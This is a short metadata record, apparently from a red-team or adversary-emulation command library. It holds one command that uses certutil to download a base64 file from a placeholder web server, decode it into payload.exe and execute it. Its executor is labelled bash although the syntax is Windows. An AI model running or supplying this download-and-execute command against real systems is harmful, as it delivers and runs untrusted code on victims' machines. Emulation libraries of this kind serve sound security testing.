---
id: 6391f28b-7e3a-499b-8c15-93c553d88e17
name: Download and decode payload from web server
type: command
executor: bash
data: certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
  -decode payload.b64 payload.exe & payload.exe
output: null
created_at: '2023-04-06T03:56:27.017025+00:00'
updated_at: '2023-04-10T20:37:10.655700+00:00'
---

# Download and decode payload from web server

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
